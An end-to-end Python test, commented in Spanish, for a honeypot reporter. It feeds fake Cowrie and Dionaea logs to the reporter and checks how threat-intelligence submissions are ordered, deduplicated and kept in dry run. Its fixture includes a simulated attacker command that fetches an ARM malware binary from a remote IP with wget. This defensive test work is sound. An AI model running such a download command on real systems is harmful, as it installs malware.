#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
Ejecuta el orquestador entero contra honeypots falsos: un cowrie.json y una
dionaea.sqlite creados al vuelo, con el esquema real de ambos.

    python3 tests/test_end_to_end.py       ->  codigo 0 si todo pasa

Lo que de verdad comprueba, y que no se ve mirando el codigo:

  - que la cadena sale en el ORDEN correcto (VirusTotal antes que
    MalwareBazaar), que es de lo que depende la autoria
  - que una segunda pasada no repite nada
  - que los codigos de salida distinguen los casos
  - que en simulacion no sale ni una sola publicacion a la red
"""

from __future__ import annotations

import functools
import hashlib
import json
import os
import sqlite3
import sys
import tempfile
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

from harness import LLAMADAS, Resultados, instalar_doble

instalar_doble()

from common import http as http_mod, ratelimit                   # noqa: E402
from common.config import Config                                 # noqa: E402

R = Resultados("test_end_to_end")
AHORA = datetime.now(timezone.utc)

# Informe con veredicto firme: 15 motores, tres familias concretas, reciente.
INFORME = {"data": {"attributes": {
    "last_analysis_stats": {"malicious": 15, "suspicious": 1, "undetected": 20},
    "last_analysis_results": {
        **{f"M{i}": {"result": n} for i, n in enumerate(
            ["Mirai"] * 9 + ["Gafgyt"] * 3 + ["Tsunami"] * 3)},
        **{f"U{i}": {"result": None} for i in range(20)}},
    "first_submission_date": int((AHORA - timedelta(days=1)).timestamp()),
    "vhash": "vh-e2e", "ssdeep": "3:x:y"}}}


def preparar_honeypots(d: Path) -> tuple[Path, Path, Path, Path, str]:
    """Crea un cowrie.json y una dionaea.sqlite con el esquema real."""
    logdir = d / "cowrie-log"; logdir.mkdir()
    descargas = d / "downloads"; descargas.mkdir()
    binarios = d / "binaries"; binarios.mkdir()

    elf = b"\x7fELF\x01\x01\x01" + bytes(11) + b"\x28\x00" + b"K" * 400
    sha = hashlib.sha256(elf).hexdigest()
    (descargas / sha).write_bytes(elf)

    ts = AHORA.isoformat()
    eventos = [
        {"eventid": "cowrie.session.connect", "src_ip": "45.9.148.99",
         "src_port": 4412, "dst_port": 22, "protocol": "ssh", "timestamp": ts},
        *[{"eventid": "cowrie.login.failed", "src_ip": "45.9.148.99",
           "timestamp": ts} for _ in range(5)],
        {"eventid": "cowrie.login.success", "src_ip": "45.9.148.99", "timestamp": ts},
        {"eventid": "cowrie.command.input", "src_ip": "45.9.148.99",
         "input": "wget http://185.7.7.7/arm7", "timestamp": ts},
        {"eventid": "cowrie.session.file_download", "src_ip": "45.9.148.99",
         "url": "http://185.7.7.7/arm7", "shasum": sha, "timestamp": ts},
        # Estas dos NO deben aparecer en ningun reporte.
        {"eventid": "cowrie.session.connect", "src_ip": "198.51.100.146",
         "dst_port": 22, "timestamp": ts},
        {"eventid": "cowrie.session.connect", "src_ip": "10.0.0.5",
         "dst_port": 22, "timestamp": ts},
    ]
    (logdir / "cowrie.json").write_text(
        "\n".join(json.dumps(e) for e in eventos), encoding="utf-8")

    bd = d / "dionaea.sqlite"
    con = sqlite3.connect(bd)
    con.executescript("""
    CREATE TABLE connections (connection INTEGER PRIMARY KEY, connection_type TEXT,
      connection_protocol TEXT, connection_timestamp INTEGER, local_host TEXT,
      local_port INTEGER, remote_host TEXT, remote_port INTEGER);
    CREATE TABLE downloads (download INTEGER PRIMARY KEY, connection INTEGER,
      download_url TEXT, download_md5_hash TEXT);
    """)
    ahora = int(time.time())
    con.executemany("INSERT INTO connections VALUES (?,?,?,?,?,?,?,?)", [
        (1, "accept", "smbd", ahora, "198.51.100.146", 445, "91.240.118.5", 5123),
        (2, "reject", "smbd", ahora, "198.51.100.146", 445, "8.8.4.4", 5124),
        (3, "listen", "smbd", ahora, "198.51.100.146", 445, "198.51.100.146", 445),
    ])
    con.commit(); con.close()
    return logdir, descargas, binarios, bd, sha


def escribir_config(d: Path, logdir, descargas, binarios, bd, extra="") -> Path:
    ruta = d / f"config{len(list(d.glob('config*.ini')))}.ini"
    ruta.write_text(f"""
[general]
state_db = {d / 'estado.sqlite3'}
log_file = {d / 'reporter.log'}
lookback_hours = 24
[blocklist]
ips = 198.51.100.146, 198.51.100.161
[paths]
cowrie_log_dir = {logdir}
cowrie_log_glob = cowrie.json*
downloads_dir = {descargas}
dionaea_sqlite = {bd}
dionaea_binaries = {binarios}
[virustotal]
enabled = true
api_key = CLAVE_FALSA_VT_0123456789
[malwarebazaar]
enabled = true
api_key = CLAVE_FALSA_MB_0123456789
familias_vetadas = wannacry, wannacrypt, wanacrypt0r, wcry, wcrypt
infectores_de_fichero = virut, sality, ramnit, expiro, neshta, parite, virlock
[threatfox]
enabled = true
api_key = CLAVE_FALSA_TF_0123456789
[urlhaus]
enabled = true
api_key = CLAVE_FALSA_UH_0123456789
[abuseipdb]
enabled = true
api_key = CLAVE_FALSA_AB_0123456789
{extra}""", encoding="utf-8")
    os.chmod(ruta, 0o600)
    return ruta


def main() -> int:
    d = Path(tempfile.mkdtemp())
    logdir, descargas, binarios, bd, sha = preparar_honeypots(d)
    cfg = escribir_config(d, logdir, descargas, binarios, bd)

    import orchestrator

    # El doble responde el informe a cualquier consulta de fichero.
    from harness import responder
    responder("GET", "/files/", 200, INFORME)
    responder("POST", "mb-api", 200, {"query_status": "hash_not_found"})

    ratelimit.LIMITS = {k: (None, v[1]) for k, v in ratelimit.LIMITS.items()}
    http_mod.MAX_BACKOFF = 0.01

    # NTFS no expone el modo POSIX, asi que ahi se relaja la comprobacion de
    # permisos. En Linux, que es donde corre esto de verdad, se exige el 600.
    if os.name == "nt":
        orchestrator.Config = functools.partial(Config, require_secure_perms=False)

    # Se recuerda el cliente HTTP creado por el orquestador para poder mirar,
    # al terminar, que se habria enviado y en que orden.
    clientes: list = []
    original = orchestrator.HttpClient

    def espia(*a, **kw):
        c = original(*a, **kw)
        clientes.append(c)
        return c
    orchestrator.HttpClient = espia

    R.seccion("Self-test")
    R.igual("con una configuracion correcta sale 0",
            orchestrator.main(["-c", str(cfg), "--self-test"]), 0)

    R.seccion("Pasada completa en simulacion")
    R.igual("termina con codigo 0", orchestrator.main(["-c", str(cfg)]), 0)

    enviados = [(c["platform"], c["url"]) for c in clientes[-1].simulated_calls]
    orden = [p for p, _ in enviados]
    R.check("se publico algo en las cinco plataformas",
            {"abuseipdb", "virustotal", "malwarebazaar", "urlhaus", "threatfox"}
            <= set(orden), str(orden))
    if "virustotal" in orden and "malwarebazaar" in orden:
        R.check("VirusTotal va ANTES que MalwareBazaar (la autoria depende de esto)",
                orden.index("virustotal") < orden.index("malwarebazaar"), str(orden))
    urls = " ".join(u for _, u in enviados)
    R.check("se comento en VirusTotal", "/comments" in urls)
    R.check("se voto en VirusTotal", "/votes" in urls)

    cuerpos = json.dumps([c for c in clientes[-1].simulated_calls])
    R.check("ninguna IP propia aparece en lo que se habria enviado",
            "198.51.100.146" not in cuerpos and "198.51.100.161" not in cuerpos)
    R.check("ninguna IP privada aparece", "10.0.0.5" not in cuerpos)
    R.check("las claves salen redactadas del log",
            "CLAVE_FALSA_UH" not in cuerpos)

    R.seccion("Segunda pasada: idempotencia")
    R.igual("termina con codigo 0", orchestrator.main(["-c", str(cfg)]), 0)
    R.igual("no se envia nada nuevo", clientes[-1].simulated_calls, [])

    R.seccion("Configuracion mala")
    malo = escribir_config(d, logdir, descargas, binarios, bd,
                           extra="[gate]\nmin_malicious = 2\n")
    texto = malo.read_text(encoding="utf-8").replace(
        "ips = 198.51.100.146, 198.51.100.161", "ips =")
    malo.write_text(texto, encoding="utf-8")
    R.igual("una puerta peligrosa y sin lista de bloqueo dan codigo 3",
            orchestrator.main(["-c", str(malo), "--self-test"]), 3)
    R.igual("y una ejecucion con esa configuracion aborta con codigo 2",
            orchestrator.main(["-c", str(malo)]), 2)

    R.igual("un config que no existe da codigo 2",
            orchestrator.main(["-c", str(d / "no-existe.ini")]), 2)

    R.seccion("El config.ini.example copiado sin editar NO se da por bueno")
    # Es el escenario real de una instalacion de cero: se copia el ejemplo y se
    # olvida sustituir algun marcador. Antes esto pasaba el self-test dejando
    # la IP de administracion sin proteger.
    ejemplo = (Path(__file__).resolve().parent.parent / "config.ini.example")
    sin_editar = d / "sin-editar.ini"
    sin_editar.write_text(
        ejemplo.read_text(encoding="utf-8")
        .replace("/var/lib/dirtyland-reporter", str(d))
        .replace("/var/log/dirtyland-reporter", str(d)), encoding="utf-8")
    os.chmod(sin_editar, 0o600)
    R.igual("el ejemplo tal cual da codigo 3",
            orchestrator.main(["-c", str(sin_editar), "--self-test"]), 3)

    R.seccion("Con las claves sin sustituir no se toca la red")
    # Situacion real entre instalar y poner las claves: el cron corre cada 15
    # minutos. Si una clave de ejemplo contara como configurada, en cuanto
    # hubiera una muestra el reporter consultaria VirusTotal una y otra vez con
    # una clave invalida, acumulando 401 desde nuestra IP.
    marcadores = d / "con-marcadores.ini"
    marcadores.write_text(f"""
[general]
state_db = {d / 'otro-estado.sqlite3'}
log_file = {d / 'reporter.log'}
[blocklist]
ips = 198.51.100.146, 198.51.100.161
[paths]
cowrie_log_dir = {logdir}
cowrie_log_glob = cowrie.json*
downloads_dir = {descargas}
[virustotal]
enabled = true
api_key = <CLAVE-API-VIRUSTOTAL>
[abuseipdb]
enabled = true
api_key = <CLAVE-API-ABUSEIPDB>
""", encoding="utf-8")
    os.chmod(marcadores, 0o600)
    antes = len(LLAMADAS)
    R.igual("la pasada termina bien igualmente",
            orchestrator.main(["-c", str(marcadores)]), 0)
    R.igual("y no hace ni una sola peticion", len(LLAMADAS) - antes, 0)

    R.seccion("Las tres de abuse.ch comparten una sola clave")
    # Son la misma cuenta: pedir la Auth-Key tres veces solo sirve para que un
    # dia se pegue mal en una y falle justo esa.
    from common.config import Config as _Config
    compartida = d / "compartida.ini"
    compartida.write_text(f"""
[general]
state_db = {d / 'compartida.sqlite3'}
log_file = {d / 'reporter.log'}
[blocklist]
ips = 198.51.100.146
[api_keys]
abusech = CLAVE_ABUSECH_UNICA_012345
[malwarebazaar]
enabled = true
[threatfox]
enabled = true
[urlhaus]
enabled = true
""", encoding="utf-8")
    os.chmod(compartida, 0o600)
    c = _Config(compartida, require_secure_perms=(os.name != "nt"))
    R.check("las tres heredan la clave de [api_keys]",
            all(c.api_key(s) == "CLAVE_ABUSECH_UNICA_012345"
                for s in ("malwarebazaar", "threatfox", "urlhaus")))

    propia = d / "propia.ini"
    propia.write_text(compartida.read_text(encoding="utf-8").replace(
        "[malwarebazaar]\nenabled = true",
        "[malwarebazaar]\nenabled = true\napi_key = SOLO_PARA_MB_98765"), encoding="utf-8")
    os.chmod(propia, 0o600)
    c2 = _Config(propia, require_secure_perms=(os.name != "nt"))
    R.check("una clave propia manda sobre la compartida",
            c2.api_key("malwarebazaar") == "SOLO_PARA_MB_98765"
            and c2.api_key("threatfox") == "CLAVE_ABUSECH_UNICA_012345")

    marcador = d / "marcador.ini"
    marcador.write_text(compartida.read_text(encoding="utf-8").replace(
        "CLAVE_ABUSECH_UNICA_012345", "<CLAVE-API-ABUSECH>"), encoding="utf-8")
    os.chmod(marcador, 0o600)
    fallos = _Config(marcador, require_secure_perms=(os.name != "nt")).validate()
    quejas = [f for f in fallos if "marcador" in f or "falta la clave" in f]
    R.igual("un marcador sin sustituir da UNA queja, no tres", len(quejas), 1)
    R.check("y senala a [api_keys], no a las plataformas",
            quejas and quejas[0].startswith("[api_keys]"), str(quejas))

    R.seccion("En simulacion no sale ni una publicacion")
    escrituras = [(m, u) for m, u in LLAMADAS if m == "POST" and "mb-api" not in u]
    R.igual("ninguna peticion de escritura llego a la red", escrituras, [])

    return R.salida()


if __name__ == "__main__":
    sys.exit(main())
